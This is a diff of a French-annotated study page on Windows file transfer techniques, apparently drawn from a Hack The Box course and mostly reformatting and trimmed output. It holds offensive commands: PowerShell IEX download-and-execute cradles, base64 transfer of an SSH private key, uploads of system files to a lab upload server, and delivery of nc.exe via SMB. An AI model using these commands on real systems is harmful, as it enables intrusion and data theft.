@@ -14,7 +14,7 @@ Prenons par exemple l'attaque <mark style="color:orange;">**Astaroth**</mark> d�
 ***
 
 {% hint style="info" %}
-**Vocabulaire :**
+<mark style="color:green;">**Vocabulaire :**</mark>
 
 1. <mark style="color:orange;">**Menace persistante avancée (APT)**</mark> <mark style="color:orange;">**:**</mark> Type d'attaque où un attaquant s'introduit dans un réseau sur une longue période, souvent sans être détecté.
 {% endhint %}
@@ -38,8 +38,8 @@ Dans l'attaque Astaroth, les étapes suivantes ont généralement été suivies 
 2. En double-cliquant sur ce fichier LNK, l'outil <mark style="color:orange;">**WMIC**</mark> s'exécute avec le paramètre "/Format", permettant le téléchargement et l'exécution de code **JavaScript** malveillant.
 3. Ce code JavaScript télécharge ensuite des charges utiles en abusant de l'outil <mark style="color:orange;">**Bitsadmin**</mark>.
 
-{% hint style="warning" %}
-#### Vocabulaire :
+{% hint style="info" %}
+<mark style="color:green;">**Vocabulaire :**</mark>
 
 8. **Spear-phishing** : Attaque ciblée par e-mail où l'attaquant se fait passer pour une entité de confiance pour tromper la victime et la pousser à divulguer des informations sensibles ou à télécharger un logiciel malveillant.
 9. **Fichier LNK** : Raccourci ou lien vers un autre fichier ou application.
@@ -50,7 +50,7 @@ Dans l'attaque Astaroth, les étapes suivantes ont généralement été suivies 
 Toutes les charges utiles étaient encodées en **base64** et ont été décodées à l'aide de l'outil <mark style="color:orange;">**Certutil**</mark>, ce qui a permis de récupérer quelques fichiers <mark style="color:orange;">**DLL**</mark>. Ensuite, l'outil <mark style="color:orange;">**regsvr32**</mark> a été utilisé pour charger un des DLL décodés, qui a déchiffré et chargé d'autres fichiers, jusqu'à ce que la charge utile finale, Astaroth, soit injectée dans le processus <mark style="color:orange;">**Userinit**</mark>.
 
 {% hint style="info" %}
-**Vocabulaire :**
+<mark style="color:green;">**Vocabulaire :**</mark>
 
 14. **Encodage base64** : Méthode de conversion de données binaires en texte ASCII pour les rendre plus faciles à transmettre dans des formats de texte. Exemple : Encodage d'un fichier en base64 pour l'envoyer par e-mail.
 15. **Certutil** : Outil Windows pour la gestion des certificats de sécurité, souvent utilisé pour des opérations liées au chiffrement et au décodage.
@@ -82,7 +82,8 @@ mrroboteLiot@htb[/htb]$ cat id_rsa | base64 -w 0;echo
 {% endcode %}
 
 {% hint style="warning" %}
-**`base64 -w 0`** : Cette commande encode le contenu fourni en utilisant l'encodage Base64. Le flag `-w 0` signifie que la sortie sera produite sur une seule ligne sans retour à la ligne. Par défaut, `base64` insère un saut de ligne après 76 caractères, mais ici, avec `-w 0`, il supprime ces retours à la ligne.
+* Le flag `-w 0` signifie que la sortie sera produite sur une seule ligne sans retour à la ligne.&#x20;
+* Par défaut, `base64` insère un saut de ligne après 76 caractères, mais ici, avec `-w 0`, il supprime ces retours à la ligne.
 {% endhint %}
 
 {% code overflow="wrap" fullWidth="true" %}
@@ -112,10 +113,6 @@ MD5             4E301756A07DED0A2DD6953ABF015278                                
 ```
 {% endcode %}
 
-{% hint style="warning" %}
-Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
-{% endhint %}
-
 ***
 
 ## <mark style="color:red;">PowerShell Web Downloads</mark>
@@ -123,6 +120,8 @@ Note: While this method is convenient, it's not always possible to use. Windows 
 PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`.&#x20;
 
 <table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Method</strong></td><td><strong>Description</strong></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></td><td>Returns the data from a resource as a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td><td>Returns the data from a resource without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td><td>Downloads data from a resource and returns a Byte array.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td><td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td><td>Downloads data from a resource to a local file.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td><td>Downloads data from a resource to a local file without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td><td>Downloads a String from a resource and returns a String.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td><td>Downloads a String from a resource without blocking the calling thread.</td></tr></tbody></table>
+
+***
 
 <mark style="color:green;">**PowerShell DownloadFile Method**</mark>
 
@@ -138,7 +137,7 @@ PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubuserc
 ```
 {% endcode %}
 
-<mark style="color:orange;">**PowerShell DownloadString - Fileless Method**</mark>
+<mark style="color:green;">**PowerShell DownloadString - Fileless Method**</mark>
 
 {% hint style="warning" %}
 As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
@@ -158,11 +157,7 @@ PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercont
 ```
 {% endcode %}
 
-{% hint style="info" %}
-<mark style="color:orange;">**Le terme**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`IEX`**</mark> dans PowerShell est l'alias de la cmdlet **`Invoke-Expression`**. Cette cmdlet est utilisée pour évaluer et exécuter une chaîne de texte comme du code PowerShell. C'est un moyen de faire en sorte que du code soit interprété et exécuté en mémoire sans être stocké sur le disque.
-{% endhint %}
-
-<mark style="color:orange;">**PowerShell Invoke-WebRequest**</mark>
+<mark style="color:green;">**PowerShell Invoke-WebRequest**</mark>
 
 From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
 
@@ -174,7 +169,7 @@ PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P
 
 Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).&#x20;
 
-<mark style="color:orange;">**Common Errors with PowerShell**</mark>
+<mark style="color:green;">**Common Errors with PowerShell**</mark>
 
 There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
 
@@ -224,16 +219,7 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
-
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
+sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 {% endcode %}
 
@@ -243,9 +229,7 @@ To download a file from the SMB server to the current working directory, we can 
 
 {% code fullWidth="true" %}
 ```powershell
-C:\htb> copy \\192.168.220.133\share\nc.exe
-
-        1 file(s) copied.
+copy \\192.168.220.133\share\nc.exe
 ```
 {% endcode %}
 
@@ -253,9 +237,7 @@ New versions of Windows block unauthenticated guest access, as we can see in the
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
-C:\htb> copy \\192.168.220.133\share\nc.exe
-
-You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+copy \\192.168.220.133\share\nc.exe
 ```
 {% endcode %}
 
@@ -265,16 +247,7 @@ To transfer files in this scenario, we can set a username and password using our
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
-
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
 {% endcode %}
 
@@ -282,12 +255,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 {% code fullWidth="true" %}
 ```powershell
-C:\htb> net use n: \\192.168.220.133\share /user:test test
-
-The command completed successfully.
-
-C:\htb> copy n:\nc.exe
-        1 file(s) copied.
+net use n: \\192.168.220.133\share /user:test test
 ```
 {% endcode %}
 
@@ -303,7 +271,9 @@ Cette commande tente de **copier un fichier** situé sur un partage réseau SMB.
 
 Si tu exécutes cette commande et que le partage est public ou que tes informations d'identification sont déjà stockées dans la session, le fichier est copié directement sans avoir besoin de se connecter explicitement.
 
-#### 2. **Commande `net use n: \\192.168.220.133\share /user:test test`** :
+***
+
+2\. **Commande `net use n: \\192.168.220.133\share /user:test test`** :
 
 Cette commande est utilisée pour **mapper un partage réseau SMB** à une lettre de lecteur (ici, `n:`) et pour se connecter au partage en fournissant des **informations d'identification**.
 
@@ -323,7 +293,7 @@ Cette commande est utilisée pour **mapper un partage réseau SMB** à une lettr
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ sudo pip3 install pyftpdlib
+sudo pip3 install pyftpdlib
 ```
 {% endcode %}
 
@@ -333,26 +303,21 @@ Then we can specify port number 21 because, by default, `pyftpdlib` uses port 21
 
 {% code fullWidth="true" %}
 ```sh
-mrroboteLiot@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
-
-[I 2022-05-17 10:09:19] concurrency model: async
-[I 2022-05-17 10:09:19] masquerade (NAT) address: None
-[I 2022-05-17 10:09:19] passive ports: None
-[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
+sudo python3 -m pyftpdlib --port 21
 ```
 {% endcode %}
-
-After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.
 
 <mark style="color:orange;">**Transfering Files from an FTP Server Using PowerShell**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
-PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 {% endcode %}
 
+{% hint style="info" %}
 When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
+{% endhint %}
 
 <mark style="color:orange;">**Create a Command File for the FTP Client and Download the Target File**</mark>
 
@@ -376,14 +341,12 @@ This is a test file
 ```
 {% endcode %}
 
-{% hint style="info" %}
+{% hint style="warning" %}
 **`-n`**&#x20;
 
 désactive la connexion automatique, ce qui est utile si tu veux contrôler manuellement les étapes de connexion, comme fournir des informations d'identification spécifiques via un fichier de commandes (`-s:ftpcommand.txt`).
 
-**-s**
-
-**.txt** _(script file)_ :
+**-s:txt** _(script file)_ :
 
 * Spécifie un fichier contenant une série de commandes FTP à exécuter. Ici, le fichier `ftpcommand.txt` contient toutes les commandes nécessaires à l'automatisation de la session FTP (ouvrir une connexion, s'authentifier, télécharger un fichier, etc.).
 * Le préfixe `-s:` est utilisé pour indiquer au client FTP que les commandes doivent être lues à partir de ce fichier plutôt que d'être tapées manuellement.
@@ -401,12 +364,7 @@ désactive la connexion automatique, ce qui est utile si tu veux contrôler manu
 ```powershell
 PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 
-IyBDb3....o=
 PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
-
-Hash
-----
-3688374325B992DEF12793500307566D
 ```
 {% endcode %}
 
@@ -416,15 +374,13 @@ We copy this content and paste it into our attack host, use the `base64` command
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ echo IyB..o= | base64 -d > hosts
+ echo IyB..o= | base64 -d > hosts
 ```
 {% endcode %}
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ md5sum hosts 
-
-3688374325b992def12793500307566d  hosts
+md5sum hosts 
 ```
 {% endcode %}
 
@@ -438,21 +394,13 @@ PowerShell doesn't have a built-in function for upload operations, but we can us
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ pip3 install uploadserver
-
-Collecting upload server
-  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
-Installing collected packages: uploadserver
-Successfully installed uploadserver-2.0.1
+pip3 install uploadserver
 ```
 {% endcode %}
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ python3 -m uploadserver
-
-File upload available at /upload
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+python3 -m uploadserver
 ```
 {% endcode %}
 
@@ -464,15 +412,10 @@ Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/
 ```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-
-[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
-[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
 ```
 {% endcode %}
 
-#### <mark style="color:orange;">PowerShell Base64 Web Upload</mark>
-
-Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
+#### <mark style="color:green;">PowerShell Base64 Web Upload</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
@@ -505,21 +448,21 @@ Commonly enterprises don't allow the SMB protocol (TCP/445) out of their interna
 For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).
 {% endhint %}
 
-An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.
-
-When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.
+* WebDAV est une extension du protocole HTTP (RFC 4918) qui permet à un serveur web de fonctionner comme un serveur de fichiers.
+* Il est utilisé pour la création et la modification collaborative de contenu.
+* WebDAV peut fonctionner via HTTP ou HTTPS.
+* SMB peut utiliser HTTP grâce à WebDAV comme alternative de transport.
+* Lorsqu’un client tente d’accéder à un partage, il essaie d’abord via SMB.
+* Si aucun partage SMB n’est disponible, la connexion bascule automatiquement sur HTTP/WebDAV.
+* Dans une capture Wireshark, on observe qu’une tentative de connexion à un partage SMB inexistant se poursuit via HTTP.
 
 ![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)
-
-<mark style="color:orange;">**Configuring WebDav Server**</mark>
-
-To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.
 
 <mark style="color:orange;">**Installing WebDav Python modules**</mark>
 
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ sudo pip3 install wsgidav cheroot
+sudo pip3 install wsgidav cheroot
 ```
 {% endcode %}
 
@@ -527,17 +470,15 @@ mrroboteLiot@htb[/htb]$ sudo pip3 install wsgidav cheroot
 
 {% code fullWidth="true" %}
 ```shell-session
-mrroboteLiot@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
 ```
 {% endcode %}
 
 <mark style="color:orange;">**Connecting to the Webdav Share**</mark>
 
-Now we can attempt to connect to the share using the `DavWWWRoot` directory.
-
 {% code fullWidth="true" %}
 ```powershell
-C:\htb> dir \\192.168.49.128\DavWWWRoot
+ dir \\192.168.49.128\DavWWWRoot
 ```
 {% endcode %}
 
@@ -560,11 +501,9 @@ Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver
 
 ### <mark style="color:blue;">FTP Uploads</mark>
 
-Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.
-
 {% code fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
+sudo python3 -m pyftpdlib --port 21 --write
 ```
 {% endcode %}
 
@@ -574,7 +513,7 @@ Now let's use the PowerShell upload function to upload a file to our FTP Server.
 
 {% code overflow="wrap" fullWidth="true" %}
 ```powershell
-PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 {% endcode %}
 
